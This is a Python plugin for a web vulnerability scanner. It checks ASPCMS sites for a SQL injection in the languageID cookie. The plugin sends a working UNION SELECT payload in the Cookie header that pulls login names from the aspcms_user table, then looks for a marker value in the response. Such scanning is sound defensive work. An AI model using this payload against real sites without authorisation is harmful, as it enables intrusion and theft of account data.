#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="admin_aspcms/_content/_tag/aspcms_tag.asp"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        
        headers={"Host":domain,"User-Agent":" Mozilla/5.0 (Windows NT 5.1; rv:14.0)\
                     Gecko/20100101 Firefox/14.0.1","Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,\
                     */*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":" gzip, \
                     deflate","Connection": "keep-alive","Cookie": "\
                     languageID=1 union all select 888888888-1,loginname,3,4,5,6,7,8 from aspcms_user"}
#       response,content=http.request(geturl,"GET",'',headers)
        response,content=yx_httplib2_request(http,geturl,"GET",'',headers)


        if content.find("888888887")>=0 and response['status']=='200':
            request = getRequest(geturl,"GET",headers,"")
            response = getResponse(response)
            result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:aspcmslanguageidcookiesqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:aspcmslanguageidcookiesqlinjection.py, run_domain function :" + str(e))
    return result

            